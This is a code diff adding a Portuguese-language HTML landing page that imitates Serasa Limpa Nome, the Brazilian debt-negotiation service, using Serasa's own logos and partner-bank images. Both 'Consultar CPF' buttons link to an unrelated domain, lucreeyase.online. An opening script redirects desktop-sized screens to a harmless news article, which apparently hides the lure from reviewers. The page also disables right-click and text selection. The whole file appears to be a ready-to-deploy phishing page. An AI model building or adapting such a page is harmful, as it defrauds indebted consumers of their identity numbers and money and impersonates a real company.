@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa</title>
+
+    <script>
+                
+        function verificarPC(){
+            var largura = screen.width;
+            
+
+            if(largura > 766){
+                window.location.href = "https://jornal316.com.br/curiosidades/consultar-cpf-gratis-no-serasa-saiba-como-pesquisar-seu-cpf-de-graca/";   
+            }
+        }
+
+        verificarPC()
+
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Quicksand&family=Roboto&family=Rubik:wght@400;500;600&family=Work+Sans&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Quicksand', sans-serif;
+            ;
+        }
+
+
+        :root {
+            --primarycolor: #d82b80
+        }
+
+
+
+        .bar-area {
+            background-color: #d82b80;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 999;
+        }
+
+        .bar {
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90px;
+        }
+
+        .bar img {
+            max-width: 130px;
+        }
+
+        .container {
+            padding: 20px;
+            background-color: var(--primarycolor);
+        }
+
+        .header-area {
+            color: white;
+            margin-top: 90px;
+
+        }
+
+        .header-area h1 {
+            font-size: 1.7em;
+
+        }
+
+        .header-area h4 {
+            font-size: 1.0em;
+            padding-top: 15px;
+        }
+
+        .img-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .img-area img {
+            max-width: 240px;
+            width: 100%;
+            padding-top: 15px;
+        }
+
+        .query-area {
+            position: relative;
+
+        }
+
+        .query {
+            position: absolute;
+            padding: 20px 20px 10px 20px;
+            font-size: 0.9em;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0px 0px 4px 0px #7c7c7c;
+        }
+
+        .query a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 10px;
+            text-decoration: none;
+            background-color: var(--primarycolor);
+            color: #fff;
+            font-size: 1.2em;
+
+        }
+
+        #info-final {
+            margin: 0 auto;
+            padding: 0px 20px 0px 20px;
+            color: #7c7c7c;
+            font-size: 0.7em;
+            max-width: 480px;
+            
+        }
+
+        .query img {
+            position: relative;
+            max-width: 80px;
+            padding-left: 10px;
+        }
+
+        .final-query {
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: rgba(0, 0, 0, .6);
+            height: 30px;
+        }
+
+        .container-second-part {
+            padding: 30px;
+            text-align: center;
+
+        }
+
+        .container-second-part h1 {
+            font-size: 1.3em;
+        }
+
+        .container-second-part h5 {
+            color: #7c7c7c;
+            padding-top: 10px;
+
+
+        }
+
+        .companies-area {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            padding: 30px;
+        }
+
+        .companies-image img {
+            width: 90px;
+        }
+
+        .third-area {
+            padding: 20px;
+            background-color: #e4e4e4;
+        }
+
+        .third-info-area {
+            text-align: center;
+            font-size: 0.9em;
+        }
+
+        .third-info-area span {
+            color: #7c7c7c;
+        }
+
+        .benefits-area {
+            padding-top: 20px;
+        }
+
+        .info {
+            display: flex;
+            padding-top: 30px;
+        }
+
+        .info-image img {
+            max-width: 80px;
+        }
+
+        .info-text {
+            padding-left: 15px;
+            font-size: 0.8em;
+        }
+
+        .info-text span {
+            color: #7c7c7c;
+        }
+
+        footer {
+            background-color: #d82b80;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100px;
+        }
+
+        #img1{
+            width: 30px;
+            float: left;
+            border-right: 1px solid #f8f8f838;
+            padding-right: 10px;
+        }
+
+        #img2{
+            width: 140px;
+            float: right;
+            padding-left: 10px;
+        }
+
+    </style>
+</head>
+<header oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
+    <div oncontextmenu="return false" ondragstart="return false" onselectstart="return false" class="bar-area">
+        <div class="bar">
+            <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="">
+        </div>
+    </div>
+</header>
+
+<body>
+
+    <section class="main-area">
+        <div class="container">
+            <div class="header-area">
+                <h1>Serasa Limpa Nome: consulte suas dívidas e negocie com segurança</h1>
+                <h4>Escolhida como parceira por algumas instituições financeiras do país, a Serasa é um dos canais de
+                    negociação das dívidas que fazem parte da Faixa 2 do Programa Desenrola Brasil.</h4>
+            </div>
+
+            <div class="img-area">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fb212bb18f00a40869a6cd42f77cbeefc%2Ff5150006ec1c4f50a414259a42f1bb5f?format=webp"
+                    alt="">
+            </div>
+
+            <div class="query-area">
+                <div class="query">
+                    <h2>Consulte grátis e negocie em até 3 minutos</h2>
+                    <a href="https://lucreeyase.online/?page_id=97"><strong>Consultar CPF</strong></a>
+                    <div class="final-query">
+                        <span>Um produto</span>
+                        <img src="https://www.serasa.com.br/lno/static-webfiles/logo/serasa.svg" alt="">
+                    </div>
+                </div>
+
+            </div>
+            <br>
+        </div>
+        <br><br><br><br><br><br><br><br>
+        <div id="info-final">
+            <span>
+                *Ofertas de desconto disponíveis conforme condições da empresa credora.
+            </span>
+        </div>
+    </section>
+
+
+    <section class="second-part">
+        <div class="container-second-part">
+            <h1>Negocie dívidas com as seguintes empresas</h1>
+            <h5>Bancos, financeiras, redes de telefonia, varejo, empresas de recuperação de crédito e outras</h5>
+        </div>
+
+        <div class="companies-area">
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/vivo@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/bradesco@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/claro-net@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/recovery@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/nubank@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/oi@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/santander@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/hoepers@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/itapeva@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/ativos@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/riachuelo@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/itau@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/bb@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/ipanema@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/credsystem@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/carrefour@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/avon@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/crediativos@2x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/havan@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/nextel@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/sky@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/bmg@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/crefisa@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/porto-seguro@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/marisa@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/renner@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/tribanco@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/cbss@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/pernambucanas@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/algar@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/dmcard@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/tim@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/dscard@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/losango@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/bv@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/zema@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/boticario@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/willbank-pag@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/senff@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/pan@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/banco-original@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/crefisa@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/inter@1x.png">
+                </div>
+            </div>
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/cea-pay@1x.png">
+                </div>
+            </div>
+
+            <div class="info-area">
+                <div class="companies-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/partners/btg@1x.png">
+                </div>
+            </div>
+        </div>
+
+    </section>
+
+    <section class="third-area">
+        <div class="third-info-area">
+            <h1>Por que negociar suas dívidas com o Serasa Limpa Nome?</h1>
+            <span>Saiba quais são as vantagens que você encontra por aqui.</span>
+        </div>
+
+        <div class="benefits-area">
+            <div class="info">
+                <div class="info-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/limpa-nome/landing-page/benefits/offers.svg"
+                        alt="">
+                </div>
+                <div class="info-text">
+                    <h1>Ofertas exclusivas<br></h1>
+                    <span>Negocie suas dívidas com até 90% de desconto e condições especiais.</span>
+                </div>
+            </div>
+
+            <div class="info">
+                <div class="info-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/limpa-nome/landing-page/benefits/security.svg"
+                        alt="">
+                </div>
+                <div class="info-text">
+                    <h1>Confiável e seguro</h1>
+                    <span>Negocie em poucos minutos, com a segurança que só a Serasa pode oferecer.</span>
+                </div>
+            </div>
+
+            <div class="info">
+                <div class="info-image">
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/limpa-nome/landing-page/benefits/agreements.svg"
+                        alt="">
+                </div>
+                <div class="info-text">
+                    <h1>Gerencie seus acordos<br></h1>
+                    <span>Emita 2ª Via e acompanhe o andamento de seus acordos e parcelamentos.</span>
+                </div>
+            </div>
+
+            <br><br>
+
+            <div class="query-area">
+                <div>
+                    <div class="query">
+                        <h2>Consulte grátis e negocie em até 3 minutos</h2>
+                        <a href="https://lucreeyase.online/?page_id=97"><strong>Consultar CPF</strong></a>
+                        <div class="final-query">
+                            <span>Um produto</span>
+                            <img src="https://www.serasa.com.br/lno/static-webfiles/logo/serasa.svg" alt="">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+    <br><br><br><br><br><br><br><br><br><br>
+    <footer>
+        <div class="footer-img1">
+            <img id="img1" src="https://www.serasa.com.br/lno/static-webfiles/common/products/square/serasa-white.svg" alt="">  
+            <img id="img2" src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="">
+        </div>
+        
+        
+
+</body>
+
+
+</html>
